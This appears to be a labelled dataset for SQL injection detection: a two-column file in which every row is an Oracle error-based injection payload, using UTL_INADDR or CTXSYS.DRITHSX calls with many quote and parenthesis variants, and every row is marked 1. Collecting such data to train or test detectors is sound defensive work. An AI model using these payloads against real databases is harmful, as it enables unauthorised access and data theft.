Query	Label
-9101')) OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND (('cUuK'='cUuK	1
-2442'))) OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND ((('CqPX'='CqPX	1
-9417' OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND 'wrKj'='wrKj	1
-3736') OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND ('ynAI' LIKE 'ynAI	1
-5362')) OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND (('vdZX' LIKE 'vdZX	1
-2274'))) OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND ((('NhCI' LIKE 'NhCI	1
-7012%' OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND 'SSzB%'='SSzB	1
-6519' OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND 'NjsX' LIKE 'NjsX	1
-8294") OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND ("nXhH"="nXhH	1
-4174")) OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND (("jblT"="jblT	1
-7513"))) OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND ((("ciUy"="ciUy	1
-8901" OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND "OgEu"="OgEu	1
-6321") OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND ("dEYz" LIKE "dEYz	1
-8737")) OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND (("hIfp" LIKE "hIfp	1
-5792"))) OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND ((("wkAz" LIKE "wkAz	1
-3232" OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) AND "TSXB" LIKE "TSXB	1
-2551 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-4626 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))# HvVy	1
-7716' OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)) OR 'lWSf'='LJdi	1
-2759') WHERE 7983=7983 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-5987") WHERE 4021=4021 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-3353) WHERE 6501=6501 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-4750' WHERE 9045=9045 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-4592" WHERE 5896=5896 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-4285 WHERE 6745=6745 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-5744')) AS MmxT WHERE 6768=6768 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-4534")) AS loVA WHERE 5133=5133 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-9842)) AS mQkx WHERE 9610=9610 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-6595') AS vjGx WHERE 2831=2831 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-9479") AS IUCt WHERE 7564=7564 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
-5628) AS VtUm WHERE 2905=2905 OR 9758=UTL_INADDR.GET_HOST_ADDRESS(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (9758=9758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))	1
3)) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)') AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)' AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)" AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (8674=8674	1
3))) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((5560=5560	1
3)))) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (((8077=8077	1
3) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)') AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ('VDHE'='VDHE	1
3)')) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (('pUCR'='pUCR	1
3)'))) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((('OLMc'='OLMc	1
3)' AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND 'pZAc'='pZAc	1
3)') AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ('MsTQ' LIKE 'MsTQ	1
3)')) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (('LpDc' LIKE 'LpDc	1
3)'))) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((('DKli' LIKE 'DKli	1
3)%' AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND 'aZuY%'='aZuY	1
3)' AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND 'SMcM' LIKE 'SMcM	1
3)") AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ("wMOA"="wMOA	1
3)")) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (("Kgdk"="Kgdk	1
3)"))) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((("HsIc"="HsIc	1
3)" AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND "QCWn"="QCWn	1
3)") AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ("oMkJ" LIKE "oMkJ	1
3)")) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND (("KnLP" LIKE "KnLP	1
3)"))) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND ((("nAZr" LIKE "nAZr	1
3)" AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) AND "iuYQ" LIKE "iuYQ	1
3) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))# Snjs	1
3)' AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))) OR 'gdrD'='SHtC	1
3)') WHERE 9823=9823 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)") WHERE 4257=4257 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)) WHERE 7934=7934 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)' WHERE 6360=6360 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)" WHERE 2793=2793 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3) WHERE 6560=6560 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)'||(SELECT CHR(72)||CHR(81)||CHR(100)||CHR(119) WHERE 7422=7422 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))||'	1
3)'||(SELECT CHR(78)||CHR(89)||CHR(113)||CHR(84) FROM DUAL WHERE 8033=8033 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))||'	1
3)'+(SELECT CHR(80)||CHR(99)||CHR(109)||CHR(81) WHERE 1148=1148 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))+'	1
3)||(SELECT CHR(89)||CHR(70)||CHR(117)||CHR(86) FROM DUAL WHERE 9660=9660 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))||	1
3)||(SELECT CHR(113)||CHR(81)||CHR(100)||CHR(78) WHERE 1712=1712 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))||	1
3)+(SELECT KRkZ WHERE 3183=3183 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))+	1
3)+(SELECT CHR(114)||CHR(119)||CHR(76)||CHR(81) WHERE 2359=2359 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113))))+	1
3)')) AS CxWW WHERE 9670=9670 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)")) AS TtOx WHERE 8696=8696 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3))) AS NwCn WHERE 2053=2053 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)') AS tyLq WHERE 9811=9811 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)") AS YZDZ WHERE 8791=8791 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)) AS haDk WHERE 8266=8266 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)` WHERE 6068=6068 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)`) WHERE 4923=4923 AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
3)' IN BOOLEAN MODE) AND 7945=CTXSYS.DRITHSX.SN(7945,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (7945=7945) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))#	1
-7045) OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-8545') OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-1949' OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
-7896" OR 5562=CTXSYS.DRITHSX.SN(5562,(CHR(113)||CHR(113)||CHR(106)||CHR(106)||CHR(113)||(SELECT (CASE WHEN (5562=5562) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(113)||CHR(106)||CHR(113)))	1
